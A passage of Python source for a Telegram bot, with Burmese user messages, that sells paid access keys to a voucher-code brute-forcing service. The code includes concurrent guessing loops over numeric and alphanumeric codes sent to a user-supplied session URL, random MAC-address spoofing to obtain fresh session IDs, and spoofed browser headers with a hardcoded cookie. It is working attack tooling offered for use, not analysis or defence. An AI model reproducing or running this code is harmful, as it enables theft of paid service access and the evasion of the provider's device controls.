            await bot.answer_callback_query(call.id, "ကျန်ရှိမှု စစ်ဆေးနေပါပြီ...")
            await send_remaining_stats(chat_id, call.message)

    except Exception as e:
        print(f"Callback Error: {e}")

def generate_redeem_code(existing_codes):
    alphabet = string.ascii_uppercase + string.digits
    while True:
        code = ''.join(random.choice(alphabet) for _ in range(6))
        if is_weak_or_blocked_key(code):
            continue
        if code not in existing_codes:
            return code

async def delete_redeem_code(chat_id, raw_code):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return

    code = re.sub(r"[^A-Za-z0-9]", "", (raw_code or "")).upper()
    if not re.fullmatch(r"[A-Z0-9]{6}", code):
        await safe_send_message(chat_id, "❌ မှန်ကန်တဲ့ ၆ လုံး Key ရိုက်ထည့်ပေးပါ (ဥပမာ - IH39KM)။")
        return

    revoked_users = 0
    stopped_scans = 0
    deleted_github = False

    async with redeem_lock:
        target_users = [
            uid for uid, acc in redeem_access.items()
            if isinstance(acc, dict) and str(acc.get("code", "")).upper() == code
        ]
        for uid in target_users:
            redeem_access.pop(uid, None)
            revoked_users += 1

            task_info = scan_tasks.get(uid)
            if task_info and task_info.get("task") and not task_info["task"].done():
                task_info["stop"] = True
                task_info["scan_id"] = None
                for child_task in task_info.get("pending", set()):
                    child_task.cancel()
                task_info["task"].cancel()
                stopped_scans += 1

        codes, sha = await get_file_content("redeem_codes.json")
        if isinstance(codes, dict) and code in codes:
            codes.pop(code, None)
            await update_file_content(
                "redeem_codes.json",
                codes,
                sha,
                f"Delete redeem code {code}"
            )
            deleted_github = True

    if not deleted_github and revoked_users == 0:
        await safe_send_message(chat_id, f"⚠️ `{code}` ကို မတွေ့ပါ။", parse_mode="Markdown")
        return

    await safe_send_message(
        chat_id,
        f"🗑️ **Key `{code}` ကို ဖျက်ပြီးပါပြီ**\n"
        f"• GitHub မှ ဖျက်ပြီး: `{'Yes' if deleted_github else 'No'}`\n"
        f"• Active Users ဖြုတ်ပြီး: `{revoked_users}`\n"
        f"• ရပ်လိုက်တဲ့ Scan: `{stopped_scans}`",
        parse_mode="Markdown"
    )

async def redeem_user_access(chat_id):
    async with redeem_lock:
        access = redeem_access.get(chat_id)
        if not access or access.get("uses_remaining", 0) <= 0:
            return False
        if is_weak_or_blocked_key(access.get("code", "")):
            redeem_access.pop(chat_id, None)
            return False
        return True

async def consume_redeem_use(chat_id):
    async with redeem_lock:
        access = redeem_access.get(chat_id)
        if not access or access.get("uses_remaining", 0) <= 0:
            return False
        if is_weak_or_blocked_key(access.get("code", "")):
            redeem_access.pop(chat_id, None)
            return False
        return True

async def process_redeem_code(message, raw_code):
    chat_id = message.chat.id
    is_admin = str(chat_id) == ADMIN_ID
    cleaned = re.sub(r"[^A-Za-z0-9]", "", (raw_code or "")).upper()
    if not re.fullmatch(r"[A-Z0-9]{6}", cleaned):
        await bot.reply_to(message, "Usage: /redeem <6-char-key>")
        return
    code = cleaned
    if is_weak_or_blocked_key(code):
        await bot.reply_to(message, "❌ ခန့်မှန်းလွယ်သော / ပိတ်ပင်ထားသော Key များကို လက်မခံပါ။ Admin ထုတ်ပေးထားသော Key ကိုသာ အသုံးပြုပါ။")
        return
    str_chat_id = str(chat_id)

    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        entry = codes.get(code) if isinstance(codes, dict) else None

        if not entry:
            await bot.reply_to(message, "❌ မှန်ကန်သော Key မဟုတ်ပါ (သို့မဟုတ် Admin ထုတ်ပေးထားသော Key မဟုတ်ပါ)။")
            return

        claimed_by = entry.get("claimed_by")
        if claimed_by and str(claimed_by) != str_chat_id:
            await bot.reply_to(message, "❌ ဒီ redeem code ကို အခြား user က အသုံးပြုပြီးပါပြီ။")
            return
        remaining = int(entry.get("uses_remaining", 0))
        if remaining <= 0:
            await bot.reply_to(message, "❌ ဒီ redeem code ရဲ့ access time ကုန်ဆုံးပါပြီ။")
            return

        entry["claimed_by"] = str_chat_id
        if not entry.get("claimed_at"):
            entry["claimed_at"] = datetime.now(timezone.utc).isoformat()
        await update_file_content("redeem_codes.json", codes, sha, f"Redeem code {code} by {str_chat_id}")
        redeem_access[chat_id] = {
            "code": code,
            "uses_remaining": remaining,
            "uses_total": int(entry.get("uses_total", remaining)),
        }

    await bot.reply_to(
        message,
        f"Redeem အောင်မြင်ပါသည်။\nSuccess ရှာဖွေခွင့် ကျန်ရှိမှု: {remaining}\n\nနောက်တစ်ဆင့် ခလုတ်ရွေးပါ —",
        reply_markup=get_after_redeem_keyboard(is_admin)
    )

async def process_genredeem_args(message, arg_text):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    parts = arg_text.split()
    if len(parts) not in (1, 2) or not parts[0].isdigit() or int(parts[0]) < 1:
        await bot.reply_to(message, "Usage: /genredeem <success-count> [count]")
        return
    uses = int(parts[0])
    count = int(parts[1]) if len(parts) == 2 and parts[1].isdigit() else 1
    if count < 1 or count > 100:
        await bot.reply_to(message, "count သည် 1 မှ 100 အတွင်း ဖြစ်ရပါမည်။")
        return
    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        if not isinstance(codes, dict):
            codes = {}
        generated = []
        for _ in range(count):
            code = generate_redeem_code(codes)
            codes[code] = {
                "uses_total": uses,
                "uses_remaining": uses,
                "claimed_by": None,
                "claimed_at": None,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }
            generated.append(f"`{code}`")
        await update_file_content("redeem_codes.json", codes, sha, f"Generate {count} redeem code(s)")
    await bot.reply_to(
        message,
        f"Generated {count} redeem code(s) with {uses} uses each (နှိပ်ပြီး copy ကူးနိုင်သည်):\n" + "\n".join(generated),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['redeem'])
async def redeem(message):
    pending_actions.pop(message.chat.id, None)
    args = message.text.split()
    if len(args) != 2:
        await bot.reply_to(message, "Usage: /redeem <6-char-key>")
        return
    await process_redeem_code(message, args[1])

@bot.message_handler(commands=['genredeem'])
async def genredeem(message):
    pending_actions.pop(message.chat.id, None)
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /genredeem <success-count> [count]")
        return
    await process_genredeem_args(message, args[1])

async def send_redeem_list(chat_id, ref_message=None):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return
    codes, _ = await get_file_content("redeem_codes.json")
    if not codes:
        await safe_send_message(chat_id, "Redeem code မရှိသေးပါ။")
        return
    lines = []
    for code, entry in codes.items():
        lines.append(f"`{code}` | {entry.get('uses_remaining', 0)}/{entry.get('uses_total', 0)} | user: {entry.get('claimed_by') or '-'}")
    for chunk in split_telegram_message("Redeem codes:\n" + "\n".join(lines)):
        await safe_send_message(chat_id, chunk, parse_mode="Markdown")

@bot.message_handler(commands=['listredeem'])
async def listredeem(message):
    pending_actions.pop(message.chat.id, None)
    await send_redeem_list(message.chat.id, message)

def is_unsupported_signed_url(url: str) -> bool:
    return bool(re.search(r"(?:[?&]v=2\b|[?&]timestamp=|[?&]sign=)", url, flags=re.IGNORECASE))

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            print(f"[check_session_url] final_url={final_url} status={response.status}")
            if "sessionId" in final_url or "sessionId" in body:
                return True
            if response.status in (200, 302, 301):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

async def process_input_url(message, url):
    chat_id = message.chat.id
    if not await redeem_user_access(chat_id):
        await bot.reply_to(message, "/input မလုပ်မီ Valid Key ကိုအရင် Redeem လုပ်ပေးပါ။")
        return
    url = url.strip()
    if is_unsupported_signed_url(url):
        await bot.reply_to(message, "ဒီလို url ပိုရင် မရပါ")
        return
    user_data.setdefault(chat_id, {})
    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
    if await check_session_url(session_url=url):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(
            message,
            "Session URL သိမ်းပြီးပါပြီ။\n\nဆက်လုပ်ရန် 🔍 Scan စရန် ခလုတ်ကို နှိပ်ပါ —",
            reply_markup=get_after_input_keyboard()
        )
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    pending_actions.pop(message.chat.id, None)
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    await process_input_url(message, args[1])

def validate_and_normalize_prefix(mode, raw_prefix):
    p = raw_prefix.strip()
    if not p or p.upper() == "AUTO":
        return ""
    if mode in ("6", "7", "8"):
        length = int(mode)
        if not p.isdigit() or len(p) > length:
            raise ValueError(f"Mode {mode} အတွက် အစနံပါတ်သည် ဂဏန်းသာဖြစ်ပြီး {length} လုံးထက် မကျော်ရပါ။")
        return p
    if mode == "ascii-lower":
        p_low = p.lower()
        if not re.fullmatch(r"[a-z]{1,6}", p_low):
            raise ValueError("Mode ascii-lower အတွက် အစစာလုံးသည် a-z ၁ လုံးမှ ၆ လုံးအတွင်း ဖြစ်ရပါမည်။")
        return p_low
    if mode == "all":
        p_low = p.lower()
        if not re.fullmatch(r"[a-z0-9]{1,6}", p_low):
            raise ValueError("Mode all အတွက် အစစာလုံး/ဂဏန်းသည် a-z, 0-9 ၁ လုံးမှ ၆ လုံးအတွင်း ဖြစ်ရပါမည်။")
        return p_low
    raise ValueError("Unsupported mode")

async def start_scan_job(mode, chat_id, message, prefix=""):
    is_admin = str(chat_id) == ADMIN_ID
    if mode not in {"6", "7", "8", "all", "ascii-lower"}:
        await bot.reply_to(message, "Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
        return
    if not await redeem_user_access(chat_id):
        await bot.reply_to(message, "/scan မလုပ်မီ Valid Key အရင်ထည့်ပေးပါ။", reply_markup=get_main_keyboard(is_admin))
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan မလုပ်မီ Session URL အရင်ထည့်ပေးပါ။", reply_markup=get_after_redeem_keyboard(is_admin))
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ ရပ်လိုလျှင် ခလုတ်နှိပ်ပါ —", reply_markup=get_scanning_keyboard())
        return
    if not await consume_redeem_use(chat_id):
        await bot.reply_to(message, "Redeem access time ကုန်ဆုံးပါပြီ။")
        return

    access = redeem_access.get(chat_id, {})
    if access.get("code"):
        _admin_notified_exhausted.discard(f"{chat_id}:{access['code']}")

    prefix_label = prefix if prefix else "AUTO (ကျပန်း)"
    progress_msg = await safe_send_message(
        chat_id,
        f"🔍Scanning Codes...\n🎯Mode : {mode} | 🔢Start : {prefix_label}\n\n",
        reply_markup=get_scanning_keyboard()
    )
    scan_id = str(uuid.uuid4())
    now_mono = time.monotonic()
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg, prefix=prefix)
    )

    scan_tasks[chat_id] = {
        "task": task, "stop": False, "scan_id": scan_id, "checked": 0, "total": None,
        "speed": 0, "found": 0, "retries": 0, "start_time": now_mono,
        "last_progress_time": now_mono, "stalled_alerted": False,
        "mode": mode, "prefix": prefix,
    }

@bot.message_handler(commands=['scan'])
async def scan(message):
    pending_actions.pop(message.chat.id, None)
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "🔍 ရှာဖွေလိုသော Mode ခလုတ်ကို ရွေးပါ —", reply_markup=get_scan_keyboard())
        return
    mode = args[1]
    prefix = ""
    if len(args) >= 3:
        try:
            prefix = validate_and_normalize_prefix(mode, args[2])
        except ValueError as e:
            await bot.reply_to(message, str(e))
            return
    await start_scan_job(mode, message.chat.id, message, prefix=prefix)

async def send_bot_status(chat_id, ref_message=None):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for cid in redeem_access if redeem_access[cid].get("uses_remaining", 0) > 0)
    uptime_seconds = time.monotonic() - _start_time
    await safe_send_message(
        chat_id,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {format_duration(uptime_seconds)}\n"
        f"⚡ Concurrency: {CONCURRENCY}\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['status'])
async def status(message):
    pending_actions.pop(message.chat.id, None)
    await send_bot_status(message.chat.id, message)

async def send_remaining_stats(chat_id, ref_message=None):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return

    lines = ["📈 ကျန်ရှိမှု & Live Stats\n"]

    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if active:
        lines.append(f"📡 Active Scans ({len(active)})")
        for cid, d in active.items():
            checked = d.get("checked", 0)
            total = d.get("total")
            speed = d.get("speed", 0)
            found = d.get("found", 0)
            retries = d.get("retries", 0)
            mode = d.get("mode", "?")
            prefix = d.get("prefix") or "AUTO"
            acc = redeem_access.get(cid, {})
            rem_uses = acc.get("uses_remaining", 0)
            tot_uses = acc.get("uses_total", 0)
            elapsed_s = time.monotonic() - d.get("start_time", time.monotonic())
            pct_str = f" ({(checked/total)*100:.1f}%)" if total else ""
            lines.append(
                f"• User {cid} | Mode {mode} | Start {prefix}\n"
                f"  📦 {checked:,}{pct_str} | ⚡ {speed:,.0f}/m | ✅ Found {found} | 🔁 {retries} | ⏱ {format_duration(elapsed_s)}\n"
                f"  🎟 Key {acc.get('code', '-')} ကျန်ရှိမှု: {rem_uses}/{tot_uses}"
            )
    else:
        lines.append("📡 Active Scans: မရှိပါ")

    if redeem_access:
        lines.append("\n👤 လက်ရှိ သုံးနေသော User များ")
        for uid, acc in redeem_access.items():
            lines.append(f"• {uid} → Key {acc.get('code')} | ကျန်ရှိ: {acc.get('uses_remaining', 0)}/{acc.get('uses_total', 0)}")

    codes, _ = await get_file_content("redeem_codes.json")
    if codes:
        lines.append("\n🗂 GitHub Key များ ကျန်ရှိမှု")
        for c, entry in codes.items():
            lines.append(f"• {c}: {entry.get('uses_remaining', 0)}/{entry.get('uses_total', 0)} | user: {entry.get('claimed_by') or '-'}")

    for chunk in split_telegram_message("\n".join(lines)):
        await safe_send_message(chat_id, chunk)

@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    pending_actions.pop(message.chat.id, None)
    await send_remaining_stats(message.chat.id, message)

async def trigger_stop_scan(chat_id, ref_message=None):
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        for child_task in data.get("pending", set()):
            child_task.cancel()
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        await safe_send_message(chat_id, "🛑 /scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_stopped_keyboard())
    else:
        await safe_send_message(chat_id, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။", reply_markup=get_stopped_keyboard())

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    pending_actions.pop(message.chat.id, None)
    await trigger_stop_scan(message.chat.id, message)

@bot.message_handler(func=lambda message: message.chat.id in pending_actions and message.text and not message.text.startswith("/"))
async def handle_pending_text(message):
    chat_id = message.chat.id
    state = pending_actions.pop(chat_id, None)
    text = message.text.strip()
    if not state:
        return
    action = state.get("type")
    if action == "redeem":
        await process_redeem_code(message, text)
    elif action == "input":
        await process_input_url(message, text)
    elif action == "genredeem":
        await process_genredeem_args(message, text)
    elif action == "delete_key":
        await delete_redeem_code(chat_id, text)
    elif action == "add_uses":
        await add_key_uses(chat_id, text)
    elif action == "reset_key":
        await reset_key_usage(chat_id, text)
    elif action == "scan_prefix":
        mode = state.get("mode")
        try:
            prefix = validate_and_normalize_prefix(mode, text)
        except ValueError as e:
            pending_actions[chat_id] = state
            await bot.reply_to(message, f"❌ {e}\nထပ်မံရိုက်ထည့်ပါ (သို့မဟုတ် AUTO ရိုက်ပါ)။")
            return
        await start_scan_job(mode, chat_id, message, prefix=prefix)

def digit_generator(length, prefix=""):
    rem = length - len(prefix)
    if rem <= 0:
        yield prefix[:length]
        return
    while True:
        yield prefix + "".join(random.choice(string.digits) for _ in range(rem))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6, prefix=""):
    rem = length - len(prefix)
    if rem <= 0:
        yield prefix[:length]
        return
    while True:
        yield prefix + "".join(random.choice(strings) for _ in range(rem))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6, prefix=""):
    rem = length - len(prefix)
    if rem <= 0:
        yield prefix[:length]
        return
    while True:
        yield prefix + "".join(random.choice(strings_2) for _ in range(rem))

def iter_codes(mode, prefix=""):
    if mode in ["6", "7"]:
        length = int(mode)
        if prefix:
            rem = length - len(prefix)
            if rem <= 0:
                yield prefix[:length]
                return
            sub_total = 10 ** rem
            start = random.randrange(sub_total)
            step = random.randrange(1, sub_total, 2)
            while sub_total > 5 and step % 5 == 0:
                step = random.randrange(1, sub_total, 2)
            for offset in range(sub_total):
                yield prefix + str((start + offset * step) % sub_total).zfill(rem)
            return

        total = 10 ** length
        start = random.randrange(total)
        step = random.randrange(1, total, 2)
        while step % 5 == 0:
            step = random.randrange(1, total, 2)
        for offset in range(total):
            yield str((start + offset * step) % total).zfill(length)
        return
    if mode == "8":
        yield from digit_generator(8, prefix=prefix)
        return
    if mode == "ascii-lower":
        yield from ascii_generator(6, prefix=prefix)
        return
    if mode == "all":
        yield from all_generator(6, prefix=prefix)
        return
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n[{bar}]"
    return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n📊Status : running\n"

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {"session_id": None, "auth_code": None, "lock": asyncio.Lock()}
    return captcha_state[chat_id]

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, prefix=""):
    try:
        code_iter = iter_codes(mode, prefix=prefix)
    except ValueError as e:
        await safe_send_message(chat_id, str(e))
        return

    if mode in ["6", "7"]:
        length = int(mode)
        rem = max(0, length - len(prefix))
        total = 10 ** rem
    else:
        total = None

    checked = 0
    last_checked_snapshot = 0
    last_checked_move_time = time.monotonic()
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    global _voucher_sem
    effective_concurrency = CONCURRENCY
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["pending"] = pending
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(session_url, code, chat_id, scan_id, message=message)

    async def _check_stalled():
        nonlocal last_checked_snapshot, last_checked_move_time
        now = time.monotonic()
        if checked != last_checked_snapshot:
            last_checked_snapshot = checked
            last_checked_move_time = now
            if chat_id in scan_tasks:
                scan_tasks[chat_id]["stalled_alerted"] = False
            return

        task_rec = scan_tasks.get(chat_id)
        if task_rec and not task_rec.get("stalled_alerted") and (now - last_checked_move_time) >= STALLED_SCAN_SECONDS:
            task_rec["stalled_alerted"] = True
            idle_sec = int(now - last_checked_move_time)
            try:
                await safe_send_message(
                    chat_id,
                    f"⚠️ **Scan ရပ်တန့်/နှေးကွေးနေပါသည်**\n• Checked မတက်သည်မှာ `{format_duration(idle_sec)}` ရှိပါပြီ။\n• Session URL expire ဖြစ်နေခြင်း သို့မဟုတ် network နှေးနေခြင်း ဖြစ်နိုင်ပါသည်။"
                )
            except Exception as err:
                print(f"[stalled-user] error: {err}")
            if str(chat_id) != ADMIN_ID:
                try:
                    await safe_send_message(
                        int(ADMIN_ID),
                        f"⚠️ **Stalled Scan Alert**\n• User ID: `{chat_id}`\n• Mode: `{mode}` | Checked: `{checked:,}`\n• Idle Time: `{format_duration(idle_sec)}`"
                    )
                except Exception as err:
                    print(f"[stalled-admin] error: {err}")

    async def _flush_progress():
        nonlocal last_update, checked
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["checked"] = checked
            scan_tasks[chat_id]["speed"] = speed
            scan_tasks[chat_id]["found"] = found
            scan_tasks[chat_id]["retries"] = retries
        await _check_stalled()
        text = format_progress(checked, total, speed, found, retries)
        try:
            await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, reply_markup=get_scanning_keyboard())
        except Exception:
            try:
                new_msg = await safe_send_message(chat_id, text, reply_markup=get_scanning_keyboard())
                progress_msg.message_id = new_msg.message_id
            except Exception as err:
                print(f"Progress Message Error: {err}")

    try:
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                break
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                break

            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            elapsed_total = time.monotonic() - scan_start
            avg_speed = (checked / elapsed_total * 60) if elapsed_total > 0 else 0
            stopped_by_access = chat_id not in redeem_access
            current_task = scan_tasks.get(chat_id)
            stopped_by_stop = current_task and current_task.get("stop") and not stopped_by_access

            if stopped_by_access:
                finish_text = (
                    f"🛑Scan Stopped (Success ခွင့်ပြည့်သွားပါပြီ)\n\n"
                    f"📦Checked : {checked:,}\n✅Found : {final_found}\n🔁Retry : {final_retries}\n"
                    f"⏱Duration : {format_duration(elapsed_total)} | ⚡Avg : {avg_speed:,.0f}/m\n"
                    f"📊Reason : Success uses ကုန်ဆုံးပါပြီ\n[████████████████████]"
                )
            elif stopped_by_stop:
                finish_text = (
                    f"🛑Scan Stopped (/stop)\n\n"
                    f"📦Checked : {checked:,}\n✅Found : {final_found}\n🔁Retry : {final_retries}\n"
                    f"⏱Duration : {format_duration(elapsed_total)} | ⚡Avg : {avg_speed:,.0f}/m\n"
                    f"📊Reason : User က ရပ်လိုက်သည်\n[████████████████████]"
                )
            else:
                finish_text = (
                    f"🔍Scanning Completed\n\n"
                    f"📦Checked : {checked:,}\n✅Found : {final_found}\n🔁Retry : {final_retries}\n"
                    f"⏱Duration : {format_duration(elapsed_total)} | ⚡Avg : {avg_speed:,.0f}/m\n"
                    f"📊Progress : 100%\n[████████████████████]"
                )
            try:
                await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, reply_markup=get_stopped_keyboard())
            except Exception:
                try:
                    await safe_send_message(chat_id, finish_text, reply_markup=get_stopped_keyboard())
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")

        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
    finally:
        for child_task in pending:
            if not child_task.done():
                child_task.cancel()
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)

        try:
            await _final_sync_to_github(chat_id)
        except Exception as e:
            print(f"[run_bruteforce] final sync error: {e}")

        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        _github_sync_pending.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            print(f"[get_session_id] status={req.status} final_url={response}")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                print(f"[get_session_id] found sessionId={session_id.group(1)}")
                return session_id.group(1)
            else:
                print(f"[get_session_id] no sessionId in URL, returning previous={previous_session_id}")
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] ERROR url={session_url[:80]} exception={type(e).__name__}: {e}")
        return previous_session_id

def replace_mac(url, new_mac):
